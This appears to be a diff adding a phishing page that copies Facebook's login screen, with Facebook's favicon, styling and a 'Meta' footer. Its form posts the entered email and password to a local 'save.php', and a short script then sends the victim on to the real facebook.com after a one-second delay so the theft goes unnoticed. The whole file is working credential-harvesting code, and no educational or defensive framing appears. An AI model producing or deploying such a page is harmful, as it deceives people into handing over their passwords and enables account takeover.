@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook – log in or sign up</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+    }
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      padding: 20px;
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      width: 60px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .link {
+      text-align: center;
+      margin-top: 12px;
+    }
+    .link a {
+      text-decoration: none;
+      color: #1877f2;
+      font-size: 14px;
+    }
+    .create-btn {
+      margin-top: 20px;
+      background: #42b72a;
+    }
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      color: #777;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" alt="Facebook">
+    </div>
+    <form action="save.php" method="POST" onsubmit="redirectToFacebook()">
+      <input type="text" name="email" placeholder="Mobile number or email address" required>
+      <input type="password" name="pass" placeholder="Password" required>
+      <button type="submit">Log in</button>
+    </form>
+    <div class="link">
+      <a href="#">Forgotten password?</a>
+    </div>
+    <hr>
+    <button class="create-btn">Create new account</button>
+  </div>
+
+  <footer>Meta</footer>
+
+  <script>
+    function redirectToFacebook() {
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com";
+      }, 1000); // 1 second delay for form submit
+    }
+  </script>
+
+</body>
+</html>
